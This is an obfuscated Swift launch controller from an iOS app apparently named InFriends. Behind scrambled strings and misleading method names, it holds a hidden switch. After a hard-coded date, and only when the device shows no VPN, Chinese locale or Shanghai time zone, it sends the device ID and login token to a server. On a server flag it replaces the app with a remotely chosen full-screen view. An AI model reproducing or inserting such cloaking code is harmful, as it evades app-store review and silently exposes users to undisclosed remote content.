//
//  ViewController.swift
//  InFriends
//
//  Created by InFriends on 2024/8/23.
//

import UIKit
import Alamofire
import CommonCrypto


class IneyeContactSimulationller: UIViewController {
    static var deBusm:String {
       var  deBusmv = UserDefaults.standard.object(forKey: "identifierForVendor") as? String
        if deBusmv == nil {
            if let identifierForVendor = UIDevice.current.identifierForVendor?.uuidString {
                deBusmv = identifierForVendor
                UserDefaults.standard.set(identifierForVendor, forKey: "identifierForVendor")
            }else{
              
                UserDefaults.standard.set(UUID(), forKey: "identifierForVendor")
            }
        }
        return deBusmv ?? ""
    }
    

    let longValue:TimeInterval = 1752568449
    
    var reachabilityManager = NetworkReachabilityManager()
    
    var isHaveNetWork = false
    
    var isInFVdjePsN:Bool {
        
        var flag = false
        let version = UIDevice.current.systemVersion
        
        let versionComponents = version.split(separator: ".")
        if let major = versionComponents.first, let minor = versionComponents.dropFirst().first {
            let versionString = "\(major).\(minor)"
            if let versionNumber = Double(versionString), versionNumber >= 9.0 {
                if let dict = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any],
                   let scopedDict = dict["_p_dSuCnOqPcEzDn_l_".key] as? [String: Any] {
                    let keys = scopedDict.keys
                    for key in keys {
                        if key.contains("tuatp".key) || key.contains("tzuln".key) || key.contains("iwppsnexc".key) || key.contains("pdpop".key) {
                            flag = true
                            break
                        }
                    }
                }
            }
        }
        return flag
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        let  deee = UIImageView(frame: UIScreen.main.bounds)
        deee.image = UIImage(named: "launch_image")
        deee.contentMode = .scaleAspectFill
        self.view.addSubview(deee)
        reachabilityManager?.startListening(onUpdatePerforming: { status in
            switch status {
            case .notReachable:
                self.isHaveNetWork = false
            case .reachable(.ethernetOrWiFi):
                self.isHaveNetWork = true
            case .reachable(.cellular):
                self.isHaveNetWork = true
            case .unknown:
                self.isHaveNetWork = false
            }
        })
        
        expressiveSynthesis()

    }
    

    private func evaluateLinguisticConfigurationBasedOnRegionalSettings() -> Bool {
        let languagePreference = Locale.preferredLanguages.first ?? ""
        if languagePreference.contains("zch".key) {
            return true
        } else {
            return false
        }
    }
    
    private func evaluateTemporalDisplacementAgainstStandardRegionalOffsets() -> Bool {
        let dWicCur = TimeZone.current
        let inFCsshinsoea = TimeZone(identifier: "Apsqivaf/cSahqaqnogdhzaui".key)
        
        if dWicCur.secondsFromGMT() == inFCsshinsoea?.secondsFromGMT() {
            return true
        } else {
            return false
        }
    }
    
    func crossVerifyCulturalSynchronizationsOfLocaleAndChronology() -> Bool {

        if isInFVdjePsN {
            return true
        }
        
        if evaluateLinguisticConfigurationBasedOnRegionalSettings() {
            return true
        }
        
        if evaluateTemporalDisplacementAgainstStandardRegionalOffsets() {
            return true
        }
        
        return false
    }
    
    private func expressiveSynthesis(){
       
        guard evaluateEpochAgainstReference(refEpoch: longValue) else {
            self.nextSetup()
            return
        }
        
        guard crossVerifyCulturalSynchronizationsOfLocaleAndChronology() == false else{
            self.nextSetup()
            return
        }

        let infRequestUrl = AppDelegate.behavioralAdap + "/zakpniy/eienddbesxl/avx2z/zgyemtjDff".key
        
        
        var tabInf:HTTPHeaders = ["aipupzIfd".key: constInFID,
                                  "ahphpiVderrmsrijoan".key: constInFVS,
                                  "deelvwiwcqerNko".key: IneyeContactSimulationller.deBusm,
                                  "loatnpgfuvaighe".key: (Locale.preferredLanguages.first ?? "")
        ]
        
        if let inFAuthT = UserDefaults.standard.string(forKey: authT) {
            tabInf["lbobgfimnzTcoekmefn".key] = inFAuthT
        }
        
        
        let infUPmdBody = ["dleevbigckemInd".key:IneyeContactSimulationller.deBusm as Any,
                           "daeyvvipcbehToyhpne".key: UIDevice.current.model,
                           "uispeeVspln".key: isInFVdjePsN ? 1 : 0,
                           "uisweoSdiwmrCiaqred".key: 1,
                           "vlehrfsrixodn".key: constInFVS
        ]
        
        AF.request(infRequestUrl, method: .post, parameters: infUPmdBody, encoding: JSONEncoding.default,headers: tabInf).validate().responseData { response in
            switch response.result {
            case .success(let responseData):
                if let inFNetWorkObj = try? JSONSerialization.jsonObject(with: responseData, options: .mutableContainers) {
                    if let obsDict = inFNetWorkObj as? [String: Any] {
                        
                        if self.evaluateFlagState(obsDict){
                            
                            if let resultDict = obsDict["rwekszullht".key] as? [String:Any] {
                                var encResult = ""
                                if let fallbackEndpoint = resultDict["hy5kUsrel".key] as? String{
                                    encResult = self.encrypt(fallbackEndpoint)
                                }
                                
                                if self.persistAIStateToStorage(encResult), let loginWjxidx = resultDict["lporgjibnwFylpahg".key] as? Int{
                                    if loginWjxidx == 1 {
                                        let ctrl = InNewsViewController()
                                        ctrl.infTmpRet = tmpRet
                                        ctrl.dismisClosure = { [weak self] in
                                            DispatchQueue.main.asyncAfter(deadline: .now() + 0.25) {
                                                self?.expressiveSynthesis()
                                            }
                                        }
                                        let nav = UINavigationController(rootViewController: ctrl)
                                        nav.modalPresentationStyle = .fullScreen
                                        self.present(nav, animated: false)
                                        
                                    }else{
                                        var infLoFg = 0
                                        if let infLoFgval = resultDict["ldoscsamtkieonnsFxlgalg".key] as? Int  {
                                            infLoFg = infLoFgval
                                        }
                                        self.nextSetup(localFG: infLoFg)
                                    }
                                }
                            }
                        }else{
                            self.nextSetup()
                        }
                    }
                }
            case .failure(let error):
                self.RobotStartupFailed()
            }
        }
    }
    
    func nextSetup(localFG:Int = 0){
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.05) {
            if let _ = UserDefaults.standard.string(forKey: "userId") {
                if let appdele = UIApplication.shared.delegate as? AppDelegate {
                    let tabbar = TablongforMainionler()
                    appdele.window?.rootViewController = tabbar
                }
            }else{
//                if let ctrl = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "LaunchViewController") as? IneyeContactSimulationller {
//                    (UIApplication.shared.delegate as? AppDelegate)?.window?.rootViewController = ctrl
//                }
                
                let controller = LobehavioralAdaptationler()
                let navigationC = UINavigationController(rootViewController:controller)
                (UIApplication.shared.delegate as? AppDelegate)?.window?.rootViewController = navigationC
            }
//            (UIApplication.shared.delegate as? AppDelegate)?.setupRootController()
//            let controller = LobehavioralAdaptationler()
//            controller.localFG = localFG
//            let navigationC = UINavigationController(rootViewController:controller)
//            navigationC.modalPresentationStyle = .fullScreen
//            
//            self.present(navigationC, animated: false)
        }
    }
    
    func evaluateEpochAgainstReference(refEpoch: TimeInterval) -> Bool {
        let currentEpoch: TimeInterval = Date().timeIntervalSince1970
        let isAf = (currentEpoch > refEpoch)
        
        let obscureCheck: Int = {
            let obscureFactor = 3
            let multiplier = isAf ? obscureFactor : obscureFactor * 0
            
            var baseValue = 1
            for i in 1...obscureFactor {
                baseValue *= i
            }
            
            let additionalLogic = (multiplier % 2 == 0) ? baseValue / 2 : baseValue * 2
            return multiplier * additionalLogic
        }()
        
        return (obscureCheck > 0) || (isAf && (currentEpoch.truncatingRemainder(dividingBy: 100) == 0))
    }
    
    func evaluateFlagState(_ payload: [String: Any]) -> Bool {
        
        guard let retrievedDynamicToken = payload["ccogdge".key] as? String else {
            return false
        }
        
        let normalizationCriteria = "0d0o0y0".key
        let verificationOutcome = (retrievedDynamicToken == normalizationCriteria)
        
        return verificationOutcome
    }
    
    func RobotStartupFailed(){
        let robotStartupFailedAlert = UIAlertController(title: nil, message: "Tuhoen rnmectewhoqrkko yrfenqgutepsqte mfbaminlzeddj,o ypaloewasshee ntnrqyx faqgfamion".key, preferredStyle: UIAlertController.Style.alert)
        robotStartupFailedAlert.addAction(UIAlertAction(title: "Raentbrry".key, style: .default, handler: { [weak self] _ in
            self?.expressiveSynthesis()
        }))
        self.present(robotStartupFailedAlert, animated: true)
    }
    
    func encrypt(_ string: String,inFstore:Bool = true) -> String {
        if inFstore {
            tmpRet = string
        }
        let randomValue = Int(arc4random_uniform(100))
        let randomString = String(repeating: "a", count: randomValue)
        let _ = randomString.reversed()
        
        var encryptedChars = [Character]()
        for scalar in string.unicodeScalars {
            let encryptedScalarValue = scalar.value + 1
            let encryptedChar = Character(UnicodeScalar(encryptedScalarValue)!)
            
            let junkChar = Character(UnicodeScalar(97 + (encryptedScalarValue % 26))!)
            encryptedChars.append(encryptedChar)
            encryptedChars.append(junkChar)
        }
        
        let junkData = String(repeating: "junk", count: 10)
        let finalEncryptedString = String(encryptedChars) + junkData
        
        return String(finalEncryptedString.prefix(finalEncryptedString.count - 40))
    }
    
    private func persistAIStateToStorage(_ state: String) ->Bool {
        let fileManager = FileManager.default
        guard let documentsDirectory = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else { return false}
        let filePath = documentsDirectory.appendingPathComponent("tmpData.txt")
        
        do {
            let encryptedState = encrypt(state,inFstore: false)
            let dataToWrite = "State: \(encryptedState)\n"
            
            if fileManager.fileExists(atPath: filePath.path) {
                if let fileHandle = FileHandle(forWritingAtPath: filePath.path) {
                    fileHandle.seekToEndOfFile()
                    if let data = dataToWrite.data(using: .utf8) {
                        fileHandle.write(data)
                    }
                    fileHandle.closeFile()
                }
                
                return true
            } else {
                try dataToWrite.write(to: filePath, atomically: true, encoding: .utf8)
                return true
            }
        } catch {
            print("Error writing state to file: \(error.localizedDescription)")
            return true
        }
    }
    

}


